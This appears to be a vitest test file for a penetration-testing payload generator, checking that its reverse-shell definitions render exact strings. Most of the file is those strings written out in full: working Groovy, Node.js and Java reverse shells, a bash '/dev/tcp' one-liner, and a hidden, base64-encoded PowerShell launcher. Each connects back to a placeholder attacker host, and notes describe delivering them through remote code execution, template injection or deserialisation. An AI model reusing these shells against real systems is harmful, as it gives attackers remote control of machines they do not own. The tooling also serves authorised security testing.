import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import { decodeUtf16leBase64 } from "../../../engines/payloads/encode";
import { CODE_SHELLS } from "../../../engines/payloads/codeShells";
import { SHELLS } from "../../../engines/payloads/shells";

const V = { LHOST: "192.0.2.10", LPORT: "443", TARGET_IP: "198.51.100.20", UPLOAD_PATH: "uploads" };
const def = (id: string) => {
  const d = CODE_SHELLS.find((x) => x.id === id);
  if (!d) throw new Error(id);
  return d;
};
const groovy = (cmd: string) =>
  `String host="192.0.2.10";int port=443;String cmd="${cmd}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();`;
const node = (sh: string) =>
  `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("${sh}",[]);var client=new net.Socket();client.connect(443,"192.0.2.10",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`;

const EXPECTED: Record<string, { ctx: "groovy" | "node" | "java"; text: string }> = {
  "groovy-linux": { ctx: "groovy", text: groovy("/bin/bash") },
  "groovy-windows": { ctx: "groovy", text: groovy("cmd.exe") },
  "node-linux": { ctx: "node", text: node("/bin/sh") },
  "node-windows": { ctx: "node", text: node("cmd.exe") },
  "java-linux": { ctx: "java", text: `Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/192.0.2.10/443 0>&1"});` },
};

describe("CODE_SHELLS", () => {
  it("builds the exact text per def", () => {
    for (const [id, want] of Object.entries(EXPECTED)) {
      const b = buildPayload(def(id), want.ctx, V);
      expect(b.text, id).toBe(want.text);
      expect(b.unresolved, id).toEqual([]);
      expect(b.trigger, id).toBeNull();
    }
  });

  it("java-windows runs a base64 PowerShell script with the given host", () => {
    const { text } = buildPayload(def("java-windows"), "java", V);
    const m = text.match(/^Runtime\.getRuntime\(\)\.exec\("powershell -nop -w hidden -e (\S+)"\);$/);
    expect(m).not.toBeNull();
    const script = decodeUtf16leBase64(m![1]!);
    expect(script).toContain("192.0.2.10");
    expect(script).toContain("443");
  });

  it("context notes are set", () => {
    expect(buildPayload(def("groovy-linux"), "groovy", V).notes).toContain("Pasted into the Groovy console as-is.");
    expect(buildPayload(def("node-linux"), "node", V).notes).toContain("Runs as Node code (RCE or SSTI in a Node template).");
    expect(buildPayload(def("java-linux"), "java", V).notes).toContain("Runs as Java (deserialisation or expression-language RCE).");
  });

  it("every def has parts and a note, and every part token appears in its text", () => {
    for (const d of CODE_SHELLS) {
      expect(d.parts.length, d.id).toBeGreaterThan(0);
      expect(d.notes?.length, d.id).toBeGreaterThan(0);
      const { text } = buildPayload(d, d.contexts[0]!, V);
      for (const p of d.parts) expect(text.includes(p.token), `${d.id}: ${p.token}`).toBe(true);
    }
  });

  it("SHELLS has unique ids", () => {
    const ids = SHELLS.map((d) => d.id);
    expect(new Set(ids).size).toBe(ids.length);
  });
});
